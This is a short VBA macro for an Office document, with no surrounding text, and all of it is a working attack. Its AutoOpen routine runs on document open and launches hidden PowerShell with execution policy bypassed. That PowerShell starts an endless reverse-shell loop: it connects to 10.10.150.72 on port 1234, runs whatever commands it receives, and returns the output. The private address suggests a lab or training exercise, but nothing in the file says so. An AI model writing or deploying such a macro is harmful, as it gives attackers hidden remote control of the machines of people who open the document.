Sub AutoOpen()
    Call list
End Sub

Sub list
    Dim objshell As Object
    Set objshell = CreateObject("Wscript.Shell")
    objshell.Run "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""$command = {while($true){try {$cl = New-Object System.Net.Sockets.TcpClient('10.10.150.72', 1234);$st = $cl.GetStream();$rd = New-Object IO.StreamReader($st);$wr = New-Object IO.StreamWriter($st);$wr.AutoFlush = $true;while($cl.Connected){$cmd = $rd.ReadLine();if($cmd -eq 'exit'){break};try{$res = iex $cmd 2>&1 | Out-String;}catch{$res = $_.Exception.Message;}$wr.WriteLine($res);$wr.Flush();}$cl.Close();}catch {Start-Sleep -Seconds 10;}Start-Sleep -Seconds 60;}}; Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', $command"""
    Set objshell = Nothing
End Sub
